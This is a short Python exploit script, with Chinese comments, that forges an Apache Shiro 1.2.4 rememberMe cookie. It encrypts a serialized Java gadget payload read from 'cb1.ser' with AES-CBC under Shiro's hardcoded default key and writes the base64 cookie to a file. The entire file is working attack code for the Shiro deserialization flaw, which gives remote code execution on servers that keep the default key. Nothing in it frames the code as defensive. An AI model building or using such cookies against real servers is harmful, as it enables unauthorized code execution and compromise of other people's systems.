import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

# Shiro 1.2.4 rememberMe 的甲：base64( IV(16B) + AES-CBC(序列化弹) )，默认 key
KEY = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')
payload = open('cb1.ser', 'rb').read()
iv = os.urandom(16)
ct = AES.new(KEY, AES.MODE_CBC, iv).encrypt(pad(payload, 16))
open('cookie.txt', 'w').write(base64.b64encode(iv + ct).decode())
print('cookie ready:', len(open('cookie.txt').read()), 'chars')
